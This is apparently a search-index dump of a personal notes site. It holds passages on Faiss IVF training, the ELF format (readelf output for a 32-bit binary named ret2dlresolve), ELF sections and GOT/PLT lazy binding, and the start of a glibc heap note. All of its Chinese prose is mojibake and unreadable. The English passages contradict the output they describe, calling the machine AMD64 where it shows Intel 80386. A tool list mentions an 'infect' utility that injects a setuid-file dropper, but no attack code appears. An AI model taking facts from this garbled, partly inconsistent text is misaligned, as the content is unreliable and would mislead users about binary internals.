\\frac{\\vec{c}}{hassign}$$   è¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªå¾ˆç®€å•åœ°åˆ©ç”¨ä¼ å…¥ assign æ•°ç»„è®¡ç®—è´¨å¿ƒçš„æ–¹æ³•ï¼Œç”±å‰é¢çš„é€»è¾‘å¯ä»¥å¾—çŸ¥ï¼Œassign æ˜¯åœ¨æ¯æ¬¡è¿­ä»£å¼€å§‹ï¼Œé€šè¿‡åœ¨è´¨å¿ƒç´¢å¼• index ä¸­æ‰§è¡Œ search æ–¹æ³•å¾—åˆ°çš„ï¼›   æ€»ç»“ï¼š  train çš„æ‰§è¡Œæµç¨‹æ˜¯è¿­ä»£è®¡ç®—ï¼š  å¾—åˆ° k ä¸ªè´¨å¿ƒï¼ˆåˆå§‹åŒ–æ—¶ç”¨å…¨é‡æ•°æ®çš„ k ä¸ªéšæœºç»„åˆï¼‰ï¼› å¯¹ n ä¸ªå…¨é‡æ•°æ®ï¼Œé€šè¿‡è´¨å¿ƒç´¢å¼• index æŸ¥åˆ°ç¦»ä»–æœ€è¿‘çš„è´¨å¿ƒï¼› å¾—åˆ°æ„å»º k ä¸ªè´¨å¿ƒåˆ°è‹¥å¹²ä¸ªæ•°æ®çš„å€’æ’ç´¢å¼• assignï¼Œæ„æˆå¯¹ n ä¸ªå…¨é‡æ•°æ®å½¢æˆåˆ’åˆ†ï¼› é€šè¿‡ assign çš„é“¾è¡¨ compute_centroids é‡æ–°è®¡ç®— k ä¸ªè´¨å¿ƒï¼› å¾—åˆ° k ä¸ªè´¨å¿ƒï¼›   train å‡½æ•°çš„è¾“å‡ºæ˜¯ï¼šk ä¸ªè´¨å¿ƒ centroidsã€å€’æ’ç´¢å¼• assignï¼›    IndexIVF::add\n  ä»£ç†è°ƒç”¨ IndexIVF::add_with_idsï¼Œå…ˆæ‰¾åˆ°è¾“å…¥å‘é‡ x æœ€è¿‘çš„å‘é‡ coarse_idx åè°ƒç”¨ IndexIVF::add_coreï¼Œè¯¥å‡½æ•°çš„é€»è¾‘å¦‚ä¸‹ï¼š #    4. æ¢³ç†é€šç”¨å…¬å…±æ¡†æ¶é€»è¾‘ #  "},{"id":429,"href":"/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/elfformat/","title":"Elf Format","section":"Linuxæºç é˜…è¯»","content":" å‚è€ƒï¼š\n https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/   ELF Format #  ELF is the abbreviation for Executable and Linkable Format and defines the structure for binaries, libraries, and core files.\nThe formal specification allows the operating system to interpreter its underlying machine instructions correctly. ELF files are typically the output of a compiler or linker and are a binary format. With the right tools, such file can be analyzed and better understood.\nElf Anatomy #  Due to the extensible design of ELF files, the structure differs per file. An ELF file consists of:\n  ELF header\n  File data which consist of three parts:\n  Program Headers or Segments (9)\n  Section Headers or Sections (28)\n  Data\n    ELF Header #  With the readelf command, we can look at the structure of a file and it will look something like this:\n$ readelf -h ret2dlresolve ELF Header:  Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00  Class: ELF32  Data: 2\u0026#39;s complement, little endian  Version: 1 (current)  OS/ABI: UNIX - System V  ABI Version: 0  Type: DYN (Shared object file)  Machine: Intel 80386  Version: 0x1  Entry point address: 0x4b0  Start of program headers: 52 (bytes into file)  Start of section headers: 6216 (bytes into file)  Flags: 0x0  Size of this header: 52 (bytes)  Size of program headers: 32 (bytes)  Number of program headers: 9  Size of section headers: 40 (bytes)  Number of section headers: 29  Section header string table index: 28 ä¸‹é¢ä¾æ¬¡è§£é‡Šä¸Šé¢ä» readelf ä¸­è¯»å–å‡ºæ¥çš„ä¿¡æ¯ï¼š\nMagic #  As can be seen in this screenshot, the ELF header starts with some magic.\nThis ELF header magic provides information about the file. The first 4 hexadecimal parts define that this is an ELF file (45=E, 4c=L, 46=F), prefixed with the 7f value.\nThis ELF header is mandatory. It ensures that data is correctly interpreted during linking or execution. To better understand the inner working of an ELF file, it is useful to know this header information is used.\nClass #  After the ELF type declaration, there is a Class field defined. This value determines the architecture for the file. It can a 32-bit (=01) or 64-bit (=02) architecture.\nThe magic shows a 01, which is translated by the readelf command as an ELF32 file. In other words, an ELF file using the 32-bit architecture. Not surprising, as this particular machine contains a modern CPU.\nData #  Next part is the data field. It knows two options: 01 for LSB (Least Significant Bit), also known as little-endian. Then there is the value 02, for MSB (Most Significant Bit, big-endian).\nThis particular value helps to interpret the remaining objects correctly within the file. This is important, as different types of processors deal differently with the incoming instructions and data structures. In this case, LSB is used, which is common for AMD64 type processors.\nVersion #  Currently, there is only 1 version type: currently, which is the value â€œ01â€. So nothing interesting to remember.\nOS/ABI #  Each operating system has a big overlap in common functions. In addition, each of them has specific ones, or at least minor differences between them. The definition of the right set is done with an Application Binary Interface (ABI). This way the operating system and applications both know what to expect and functions are correctly forwarded. These two fields describe what ABI is used and the related version.\nIn this case, the value is 00, which means no specific extension is used.\nABI version #  When needed, a version for the ABI can be specified.\nMachine #  We can also find the expected machine type (AMD64) in the header.\nType #  The type field tells us what the purpose of the file is. There are a few common file types.\n CORE (value 4) DYN (Shared object file), for libraries (value 3) EXEC (Executable file), for binaries (value 2) REL (Relocatable file), before linked into an executable file (value 1)  File Data #  Before we dive into these headers, it is good to know that ELF has two complementary â€œviewsâ€:\n  One is to be used for the linker to allow execution (segments).\n  The other one for categorizing instructions and data (sections).\n  So depending on the goal, the related header types are used. Letâ€™s start with program headers, which we find on ELF binaries.\nSegments (Program Headers) #  An ELF file consists of zero or more segments, and describe how to create a process/memory image for runtime execution.\nWhen the kernel sees these segments, it uses them to map them into virtual address space, using the mmap(2) system call. In other words, it converts predefined instructions into a memory image. If your ELF file is a normal binary, it requires these program headers. Otherwise, it simply wonâ€™t run. It uses these headers, with the underlying data structure, to form a process. This process is similar for shared libraries.\nå¯ä»¥ç”¨ readelf å‘½ä»¤ --segments å‚æ•°æˆ–è€… --program-headers å‚æ•°æŸ¥çœ‹ç¨‹åºå¤´ä¿¡æ¯ï¼š\n$ readelf --segments ./ret2dlresolve  Elf file type is DYN (Shared object file) Entry point 0x4b0 There are 9 program headers, starting at offset 52  Program Headers:  Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align  PHDR 0x000034 0x00000034 0x00000034 0x00120 0x00120 R 0x4  INTERP 0x000154 0x00000154 0x00000154 0x00013 0x00013 R 0x1  [Requesting program interpreter: /lib/ld-linux.so.2]  LOAD 0x000000 0x00000000 0x00000000 0x008b0 0x008b0 R E 0x1000  LOAD 0x000ec4 0x00001ec4 0x00001ec4 0x00144 0x00148 RW 0x1000  DYNAMIC 0x000ecc 0x00001ecc 0x00001ecc 0x000f8 0x000f8 RW 0x4  NOTE 0x000168 0x00000168 0x00000168 0x00044 0x00044 R 0x4  GNU_EH_FRAME 0x000760 0x00000760 0x00000760 0x0003c 0x0003c R 0x4  GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10  GNU_RELRO 0x000ec4 0x00001ec4 0x00001ec4 0x0013c 0x0013c R 0x1   Section to Segment mapping:  Segment Sections...  00  01 .interp  02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame  03 .init_array .fini_array .dynamic .got .data .bss  04 .dynamic  05 .note.ABI-tag .note.gnu.build-id  06 .eh_frame_hdr  07  08 .init_array .fini_array .dynamic .got æˆ‘ä»¬çœ‹åˆ°ä¸Šé¢ä¸€å…±æœ‰ä¹ä¸ªç¨‹åºå¤´ï¼Œæˆ‘ä»¬åªçœ‹å…¶ä¸­çš„ä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„ä¿¡æ¯ï¼š\n GNU_EH_FRAMEï¼šè¿™é‡Œå­˜å‚¨ç€ gcc çš„ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå®ƒé‡Œé¢å­˜å‚¨çš„æ˜¯å¤„ç†ç¨‹åºå¼‚å¸¸çš„å¥æŸ„ã€‚ç¨‹åºå¼‚å¸¸æ—¶ï¼Œè¿™ä¸ªåŒºåŸŸä¼šæ­£ç¡®å¤„ç†è¿™äº›å¼‚å¸¸ï¼› GNU_STACKï¼šè¿™é‡Œæ—¶ç¨‹åºçš„æ ˆåŒºä¿¡æ¯ã€‚å¯ä»¥çœ‹åˆ°æ ˆåŒºæ—¶åªæ˜¯å¯è¯»å¯å†™çš„ã€‚  Sections (Sections Headers) #  Sections can be found in an ELF binary after the GNU C compiler transformed C code into assembly, followed by the GNU assembler, which creates objects of it.\nåŒæ ·çš„æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ readelf å‘½ä»¤çš„ --sections å‚æ•°æˆ– --sections-headers å‚æ•°æŸ¥çœ‹ç¨‹åºçš„èŠ‚å¤´ä¿¡æ¯ï¼š\n$ readelf --sections ./ret2dlresolve There are 29 section headers, starting at offset 0x1848:  Section Headers:  [Nr] Name Type Addr Off Size ES Flg Lk Inf Al  [ 0] NULL 00000000 000000 000000 00 0 0 0  [ 1] .interp PROGBITS 00000154 000154 000013 00 A 0 0 1  [ 2] .note.ABI-tag NOTE 00000168 000168 000020 00 A 0 0 4  [ 3] .note.gnu.build-i NOTE 00000188 000188 000024 00 A 0 0 4  [ 4] .gnu.hash GNU_HASH 000001ac 0001ac 000020 04 A 5 0 4  [ 5] .dynsym DYNSYM 000001cc 0001cc 0000d0 10 A 6 1 4  [ 6] .dynstr STRTAB 0000029c 00029c 0000bc 00 A 0 0 1  [ 7] .gnu.version VERSYM 00000358 000358 00001a 02 A 5 0 2  [ 8] .gnu.version_r VERNEED 00000374 000374 000030 00 A 6 1 4  [ 9] .rel.dyn REL 000003a4 0003a4 000050 08 A 5 0 4  [10] .rel.plt REL 000003f4 0003f4 000028 08 AI 5 22 4  [11] .init PROGBITS 0000041c 00041c 000023 00 AX 0 0 4  [12] .plt PROGBITS 00000440 000440 000060 04 AX 0 0 16  [13] .plt.got PROGBITS 000004a0 0004a0 000010 08 AX 0 0 8  [14] .text PROGBITS 000004b0 0004b0 000292 00 AX 0 0 16  [15] .fini PROGBITS 00000744 000744 000014 00 AX 0 0 4  [16] .rodata PROGBITS 00000758 000758 000008 00 A 0 0 4  [17] .eh_frame_hdr PROGBITS 00000760 000760 00003c 00 A 0 0 4  [18] .eh_frame PROGBITS 0000079c 00079c 000114 00 A 0 0 4  [19] .init_array INIT_ARRAY 00001ec4 000ec4 000004 04 WA 0 0 4  [20] .fini_array FINI_ARRAY 00001ec8 000ec8 000004 04 WA 0 0 4  [21] .dynamic DYNAMIC 00001ecc 000ecc 0000f8 08 WA 6 0 4  [22] .got PROGBITS 00001fc4 000fc4 00003c 04 WA 0 0 4  [23] .data PROGBITS 00002000 001000 000008 00 WA 0 0 4  [24] .bss NOBITS 00002008 001008 000004 00 WA 0 0 1  [25] .comment PROGBITS 00000000 001008 00002b 01 MS 0 0 1  [26] .symtab SYMTAB 00000000 001034 000480 10 27 43 4  [27] .strtab STRTAB 00000000 0014b4 000297 00 0 0 1  [28] .shstrtab STRTAB 00000000 00174b 0000fc 00 0 0 1 Key to Flags:  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),  L (link order), O (extra OS processing required), G (group), T (TLS),  C (compressed), x (unknown), o (OS specific), E (exclude),  p (processor specific) èŠ‚çš„å†…å®¹çš„ç¨‹åºçš„æ ¸å¿ƒå†…å®¹ï¼Œæˆ‘åœ¨å¦ä¸€ä¸ªæ–‡ä»¶ä¸­æ•´ç†äº†ç›¸å…³èŠ‚çš„ä¸»è¦ä½œç”¨ï¼šElfSections\nTools for binary analysis #  elfutils #   /usr/bin/eu-addr2line /usr/bin/eu-ar â€“ alternative to ar, to create, manipulate archive files /usr/bin/eu-elfcmp /usr/bin/eu-elflint â€“ compliance check against gABI and psABI specifications /usr/bin/eu-findtextrel â€“ find text relocations /usr/bin/eu-ld â€“ combining object and archive files /usr/bin/eu-make-debug-archive /usr/bin/eu-nm â€“ display symbols from object/executable files /usr/bin/eu-objdump â€“ show information of object files /usr/bin/eu-ranlib â€“ create index for archives for performance /usr/bin/eu-readelf â€“ human-readable display of ELF files /usr/bin/eu-size â€“ display size of each section (text, data, bss, etc) /usr/bin/eu-stack â€“ show the stack of a running process, or coredump /usr/bin/eu-strings â€“ display textual strings (similar to strings utility) /usr/bin/eu-strip â€“ strip ELF file from symbol tables /usr/bin/eu-unstrip â€“ add symbols and debug information to stripped binary  Notes: the elfutils package is a great start, as it contains most utilities to perform analysis.\nelfkickers #   /usr/bin/ebfc â€“ compiler for Brainfuck programming language /usr/bin/elfls â€“ shows program headers and section headers with flags /usr/bin/elftoc â€“ converts a binary into a C program /usr/bin/infect â€“ tool to inject a dropper, which creates setuid file in /tmp /usr/bin/objres â€“ creates an object from ordinary or binary data /usr/bin/rebind â€“ changes bindings/visibility of symbols in ELF file /usr/bin/sstrip â€“ strips unneeded components from ELF file  Notes: the author of the ELFKickers package focuses on manipulation of ELF files, which might be great to learn more when you find malformed ELF binaries.\npax-utils #   /usr/bin/dumpelf â€“ dump internal ELF structure /usr/bin/lddtree â€“ like ldd, with levels to show dependencies /usr/bin/pspax â€“ list ELF/PaX information about running processes /usr/bin/scanelf â€“ wide range of information, including PaX details /usr/bin/scanmacho â€“ shows details for Mach-O binaries (Mac OS X) /usr/bin/symtree â€“ displays a leveled output for symbols  æˆ‘ä¹ æƒ¯ç”¨çš„ #  # æŸ¥çœ‹æ–‡ä»¶å¤´ $ readelf --file-header \u0026lt;program\u0026gt;  # æŸ¥çœ‹ç¨‹åºå¤´ $ readelf --program-headers \u0026lt;program\u0026gt;  # æŸ¥çœ‹èŠ‚å¤´ $ readelf --section-headers \u0026lt;program\u0026gt;  # æŸ¥çœ‹åŠ¨æ€é“¾æ¥çš„ä¾èµ– $ lddtree \u0026lt;program\u0026gt; "},{"id":430,"href":"/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/elfsections/","title":"Elf Sections","section":"Linuxæºç é˜…è¯»","content":" å‚è€ƒï¼š\n  https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/\n  https://lief.quarkslab.com/doc/stable/tutorials/05_elf_infect_plt_got.html\n  http://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html\n  http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html\n  https://stackoverflow.com/questions/34966097/what-functions-does-gcc-add-to-the-linux-elf\n   Elf Sections #  å¸¸è§èŠ‚ #  æˆ‘ä»¬åˆ†æä»¥ä¸‹å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„èŠ‚å¤´ï¼š\n .textï¼šè¯¥æ®µåŒ…å«çš„æ˜¯å¯æ‰§è¡Œä»£ç ï¼Œè¯¥æ®µä¸­çš„æ•°æ®åªå¯è¯»ä¸å¯å†™ï¼Œè¯¥æ®µä¸­çš„æ•°æ®åªåŠ è½½ä¸€æ¬¡ã€‚ .dataï¼šå·²è¢«åˆå§‹åŒ–çš„æ•°æ®ï¼Œå¯è¯»å¯å†™ã€‚ .rodataï¼šå·²è¢«åˆå§‹åŒ–çš„æ•°æ®ï¼Œåªå¯è¯»ä¸å¯å†™ã€‚ .bssï¼šæœªåˆå§‹åŒ–æ•°æ®ï¼Œå¯è¯»å¯å†™ã€‚  é“¾æ¥ç›¸å…³ #  åŠ¨æ€é“¾æ¥è¿‡ç¨‹ #  æ­¤å¤„è¯¦è§£ä»¥ä¸‹åŠ¨æ€é“¾æ¥è¿‡ç¨‹ä¸­æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œlibc å‡½æ•°çš„é“¾æ¥è¿‡ç¨‹ã€‚libc ä¸­çš„å‡½æ•°ï¼Œè‹¥ä½¿ç”¨åŠ¨æ€é“¾æ¥ï¼Œåˆ™å…³é”®çš„ä¸¤ä¸ªè¡¨é¡¹æ—¶ .got è¡¨ä¸ .plt è¡¨ï¼Œè¿™ç§ç»‘å®šæ–¹å¼åˆç§°ä¸ºå»¶è¿Ÿç»‘å®šã€‚\næ¯”å¦‚æˆ‘ä»¬åœ¨æŸä¸€ä¸ªå‡½æ•°ä¸­è¿›è¡Œäº† puts ç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨è°ƒç”¨ä¹‹å‰è¡¨ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š\n .text sections .plt table .got table +--------------+ +---------------+ +------------------+ | [my_func] | | [puts@plt] | | [puts@got] | | | | | | | | jmp 0x400480 ----\u0026gt;| jmp 0x601028 ---\u0026gt;| 0x601028:0x400486--+ | | | | | | | | ... | +-\u0026gt;| push 0x2 | | ... | | +--------------+ | | | +------------------+ | | | jmp 0x400450 --+ | | | | | | | | ... | | | | +---------------+ | | +--------------------|----------------------+ +----------------------+ | +------------------+ +--\u0026gt;|[_dl_resolve@plt] | +------------------+ å¯è§ï¼š\n .text æ®µä¸­ä»»ä½•å¯¹ libc å‡½æ•°å¾—è°ƒç”¨ï¼Œç¼–è¯‘æ˜¯åªä¼šå°†ç¨‹åºæ‰§è¡Œæƒäº¤ç»™ .plt è¡¨ï¼› .plt è¡¨å®é™…ä¸Šæ˜¯ä¸€æ®µä»£ç ï¼Œ.got è¡¨å®é™…ä¸Šåªæ˜¯åœ°å€åˆ°åœ°å€çš„æ˜ å°„ï¼› ä¸€ä¸ªå‡½æ•°å¯¹åº”çš„ .plt è¡¨ä»£ç ç”±ä¸‰è¡Œç»„æˆï¼š  .plt è¡¨çš„ç¬¬ä¸€è¡ŒæŒ‡å‘ .got è¡¨å¯¹åº”çš„ä½ç½®ï¼› å¦‚æœå‡½æ•°ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œ.got é»˜è®¤ä¼šæŒ‡å‘ .plt è¡¨çš„ç¬¬äºŒè¡Œï¼› .plt è¡¨çš„ç¬¬äºŒä¸‰è¡Œè°ƒç”¨ _dl_runtime_resolve å‡½æ•°ï¼Œå°†å®é™…çš„åœ°å€å¯¼å…¥ .got è¡¨ä¸­    ä¹Ÿå°±æ˜¯è¯´ï¼Œè°ƒç”¨äº†ä¹‹åï¼Œè¿™ä¸‰æ®µç»“æ„ä¼šå˜æˆä¸‹é¢çš„ç»“æ„ï¼š\n .text sections .plt table .got table +--------------+ +---------------+ +--------------+ | [my_func] | | [puts@plt] | | [puts@got] | | | | | | | | jmp 0x400480 ---\u0026gt;| jmp 0x601028 ---\u0026gt;| 0x601028:puts-----\u0026gt;puts | | | | | | | ... | | push 0x2 | | ... | +--------------+ | | +--------------+ | jmp 0x400450 --+ | | | | ... | | +---------------+ | | +----------------------v | +------------------+ ---\u0026gt;|[_dl_resolve@plt] | +------------------+ åŠ¨æ€é“¾æ¥èŠ‚ #  åœ¨ä½¿ç”¨ readelf å‘½ä»¤æŸ¥çœ‹ä¸€ä¸ªç¨‹åºçš„èŠ‚åˆ—è¡¨æ—¶ï¼Œç±»å‹ä¸º REL çš„èŠ‚åŒºåŒ…å«é‡å®šä½è¡¨é¡¹ï¼š\n  .got èŠ‚ä¿å­˜å…¨å±€å˜é‡åç§»è¡¨ï¼Œ.got.plt èŠ‚ä¿å­˜å…¨å±€å‡½æ•°åç§»è¡¨ï¼›.plt èŠ‚æ˜¯è¿‡ç¨‹é“¾æ¥è¡¨ã€‚è¿‡ç¨‹é“¾æ¥è¡¨æŠŠä½ç½®ç‹¬ç«‹çš„å‡½æ•°è°ƒç”¨é‡å®šå‘åˆ°ç»å¯¹ä½ç½®ã€‚\n  .rel.dyn èŠ‚æ˜¯ç”¨äºå˜é‡é‡å®šä½ï¼Œ.rel.plt èŠ‚æ˜¯ç”¨äºå‡½æ•°é‡å®šä½ã€‚\nå¯ä»¥ä½¿ç”¨ readelf å‘½ä»¤çš„ --relocs å‚æ•°æŸ¥çœ‹è¿™ä¸¤ä¸ªèŠ‚åŒºçš„å†…å®¹ï¼š\n$ readelf -r ./ret2dlresolve  é‡å®šä½èŠ‚ \u0026#39;.rel.dyn\u0026#39; at offset 0x3a4 contains 10 entries:  åç§»é‡ ä¿¡æ¯ ç±»å‹ ç¬¦å·å€¼ ç¬¦å·åç§° 00001ec4 00000008 R_386_RELATIVE 00001ec8 00000008 R_386_RELATIVE 00001ff8 00000008 R_386_RELATIVE 00002004 00000008 R_386_RELATIVE 00001fe4 00000306 R_386_GLOB_DAT 00000000 _ITM_deregisterTMClone 00001fe8 00000406 R_386_GLOB_DAT 00000000 __cxa_finalize@GLIBC_2.1.3 00001fec 00000506 R_386_GLOB_DAT 00000000 __gmon_start__ 00001ff0 00000906 R_386_GLOB_DAT 00000000 stdin@GLIBC_2.0 00001ff4 00000a06 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0 00001ffc 00000b06 R_386_GLOB_DAT 00000000 _ITM_registerTMCloneTa  é‡å®šä½èŠ‚ \u0026#39;.rel.plt\u0026#39; at offset 0x3f4 contains 5 entries:  åç§»é‡ ä¿¡æ¯ ç±»å‹ ç¬¦å·å€¼ ç¬¦å·åç§° 00001fd0 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.0 00001fd4 00000207 R_386_JUMP_SLOT 00000000 read@GLIBC_2.0 00001fd8 00000607 R_386_JUMP_SLOT 00000000 strlen@GLIBC_2.0 00001fdc 00000707 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 00001fe0 00000807 R_386_JUMP_SLOT 00000000 write@GLIBC_2.0   .dynsym èŠ‚åŒ…å«äº†åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨ã€‚å¯ä»¥ç”¨ readelf å‘½ä»¤çš„ --symbols å‚æ•°æŸ¥çœ‹ï¼š\n$ readelf --symbols ./ret2dlresolve  Symbol table \u0026#39;.dynsym\u0026#39; contains 13 entries:  Num: Value Size Type Bind Vis Ndx Name  0: 00000000 0 NOTYPE LOCAL DEFAULT UND  1: 00000000 0 FUNC GLOBAL DEFAULT UND setbuf@GLIBC_2.0 (2)  2: 00000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.0 (2)  3: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterTMCloneTab  4: 00000000 0 FUNC WEAK DEFAULT UND __cxa_finalize@GLIBC_2.1.3 (3)  5: 00000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__  6: 00000000 0 FUNC GLOBAL DEFAULT UND strlen@GLIBC_2.0 (2)  7: 00000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.0 (2)  8: 00000000 0 FUNC GLOBAL DEFAULT UND write@GLIBC_2.0 (2)  9: 00000000 0 OBJECT GLOBAL DEFAULT UND stdin@GLIBC_2.0 (2)  10: 00000000 0 OBJECT GLOBAL DEFAULT UND stdout@GLIBC_2.0 (2)  11: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMCloneTable  12: 0000075c 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used ....   .dynstr èŠ‚åŒ…å«äº†åŠ¨æ€é“¾æ¥çš„å­—ç¬¦ä¸²ã€‚è¿™ä¸ªèŠ‚ä»¥ \\x00 ä½œä¸ºå¼€å§‹å’Œç»“å°¾ï¼Œä¸­é—´æ¯ä¸ªå­—ç¬¦ä¸²ä¹Ÿä»¥ \\x00 é—´éš”ã€‚\n  _start ç›¸å…³ #  __libc_start_main å‡½æ•°æµç¨‹ #  åœ¨ä»‹ç»è¿™ä¸€èŠ‚ä¹‹å‰å¯ä»¥éœ€è¦å…ˆäº†è§£ä»¥ä¸‹ Linux ç¨‹åºæ˜¯å¦‚ä½•å¯åŠ¨ä¸€ä¸ªç¨‹åºçš„ã€‚ä»¥ä¸‹æ˜¯ loader çš„è°ƒç”¨å›¾ï¼š\nä¸‹é¢æˆ‘ä»¬ä¾æ¬¡ä»‹ç»ä»¥ä¸‹æ•´ä¸ªç¨‹åºè¿è¡Œçš„æµç¨‹ï¼š\n  åœ¨ _start å‡½æ•°ä¹‹å‰ï¼ŒLinux è¿›è¡Œäº† execuve() ç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨æ ˆä¸Šå¸ƒç½®å¥½äº† argcã€argv ä¸ envp å‚æ•°ï¼Œå¹¶ä¸”è®¾ç½®å¥½äº† stdinã€stdoutã€stderrã€‚\n  åœ¨ _start å‡½æ•°ä¸­ï¼Œä¼ å…¥æ•°ä¸ªå‚æ•°æ‰§è¡Œäº† __libc_start_mainï¼Œè¿™ä¸ªå‡½æ•°çš„åŸå‹å¦‚ä¸‹ï¼š\nint __libc_start_main( int (*main) (int, char * *, char * *), \tint argc, char * * ubp_av, \tvoid (*init) (void), \tvoid (*fini) (void), \tvoid (*rtld_fini) (void), \tvoid (* stack_end)); è¿™äº›å‚æ•°çš„å«ä¹‰åˆ†åˆ«æ˜¯ï¼š\n mainï¼šç¨‹åºçš„ä¸»è¿›ç¨‹ï¼Œå®ƒçš„è¿”å›å€¼æœ€ç»ˆä¼šä¼ é€’ç»™ exit å‡½æ•°ï¼Œä¹‹åé€€å‡ºè¿›ç¨‹ï¼› arcgã€ubp_avï¼šmain å‡½æ•°ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•° argc ä¸ argvï¼› initï¼š__libc_csu_init çš„åœ°å€ï¼Œåœ¨ main å‡½æ•°ä¹‹å‰è°ƒç”¨ï¼Œç¨‹åºçš„æ„é€ å‡½æ•°ï¼› finiï¼š__libc_csu_fini çš„åœ°å€ï¼Œç¨‹åºçš„ææ„å‡½æ•°ï¼›é€šè¿‡ __cxat_exit å‡½æ•°æ³¨å†Œï¼› rtld_finiï¼šåŠ¨æ€é“¾æ¥æ®µçš„ææ„å‡½æ•°ï¼›é€šè¿‡ __cxat_exit å‡½æ•°æ³¨å†Œï¼› stack_endï¼šæ ˆçš„å°¾æŒ‡é’ˆï¼›    ç„¶åç¨‹åºåœ¨ç¨‹åºä¸­æŒ‰ç…§ä¸Šå›¾çš„æ¬¡åºä¾æ¬¡è°ƒç”¨å„ä¸ªå‡½æ•°ï¼ˆè¿™é‡Œå…ˆä¸ç»†è¯´äº†ï¼Œè¯¦è§ LinuxProgramStartï¼‰ã€‚\n  __libc_start_main èŠ‚ä½œç”¨ #  é‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹ä¸­ä¸»è¦åˆ›å»ºäº†å“ªäº›ä¸ªèŠ‚å‘¢ï¼Ÿ\n ä¸»è¦æœ‰ä¸‰ä¸ªï¼špreinit_arrayã€init_array ä¸ fini_arrayã€‚ è¿™ä¸‰ä¸ªèŠ‚çš„æœ¬è´¨éƒ½æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆçš„æ•°ç»„ã€‚å®ƒä»¬å­˜å‚¨çš„å‡½æ•°ï¼Œä¼šåœ¨ç¨‹åºè¿è¡Œçš„ç‰¹å®šæ—¶åˆ»ï¼Œè¢«æ‰§è¡Œã€‚  ä¸‹é¢åˆ†åˆ«ä»‹ç»è¿™ä¸‰ä¸ªèŠ‚ï¼š\n .preinit_arrayï¼šå…¶ä¸­çš„å‡½æ•°ï¼Œä¼šåœ¨ç¨‹åºçš„æ„é€ å‡½æ•°ï¼ˆä¸€èˆ¬æŒ‡ __libc_csu_initï¼‰æ‰§è¡Œä¹‹å‰ï¼Œè¢«è°ƒç”¨ï¼› .init_arrayï¼šå…¶ä¸­çš„å‡½æ•°ï¼Œä¼šåœ¨ç¨‹åºæ„é€ å‡½æ•°æ‰§è¡Œä¹‹åï¼Œmain å‡½æ•°æ‰§è¡Œä¹‹å‰è¢«æ‰§è¡Œã€‚è¿™ä¸ªæ•°ç»„æœ‰ä¸€ä¸ªé»˜è®¤å°±å­˜åœ¨çš„å‡½æ•° frame_dummyï¼Œå®ƒç”¨äºä¿æŠ¤æ ˆçš„è¿è¡Œä¸å®‰å…¨ã€‚ .fini_arrayï¼šå…¶ä¸­çš„å‡½æ•°ï¼Œä¼šåœ¨ main å‡½æ•°æ‰§è¡Œä¹‹åè¢«æ‰§è¡Œã€‚glibc ä¸­å®šä¹‰äº†ä¸€ä¸ªå‡½æ•° __do_global_dtors_aux ä¼šåœ¨è¿™ä¸ªèŠ‚æœªè¢«å®šä¹‰æ—¶è¢«é»˜è®¤æ‰§è¡Œï¼Œè¯¦è§ Stack Overflowã€‚  å½“ç„¶ï¼Œç¨‹åºå‘˜åœ¨å†™ c ç¨‹åºæ—¶å¯ä»¥è‡ªå·±å‘æ•°ç»„ä¸­æ·»åŠ å…ƒç´ ï¼š\nvoid init(int argc, char **argv, char **envp) {  printf(\u0026#34;%s\\n\u0026#34;, __FUNCTION__); }  __attribute__((section(\u0026#34;.init_array\u0026#34;))) typeof(init) *__init = init; "},{"id":431,"href":"/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/glibcheap/","title":"Glibc Heap","section":"Linuxæºç é˜…è¯»","content":" å‚è€ƒï¼šé•¿äº­ç§‘æŠ€å †çš„æ¦‚å¿µ\n å †åŸºç¡€ #  å †çš„ä¸€äº›ç‰¹ç‚¹ï¼š\n å †æ˜¯å¯ä»¥æ ¹æ®è¿è¡Œæ—¶çš„éœ€è¦è¿›è¡ŒåŠ¨æ€åˆ†é…å’Œé‡Šæ”¾çš„å†…å­˜ï¼Œå¤§å°å¯å˜ï¼› å 